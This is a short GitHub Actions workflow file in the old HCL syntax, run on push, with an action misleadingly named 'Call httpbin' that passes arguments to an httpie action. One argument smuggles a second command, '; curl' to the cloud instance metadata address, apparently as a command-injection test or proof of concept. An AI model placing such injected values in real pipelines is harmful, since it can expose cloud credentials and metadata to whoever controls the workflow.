workflow "Call external API" {
  on = "push"
  resolves = ["Call httpbin"]
}

action "Call httpbin" {
  uses = "swinton/httpie.action@master"
  args = ["GET", "169.254.169.254","; curl http://169.254.169.254/latest/meta-data"]
}
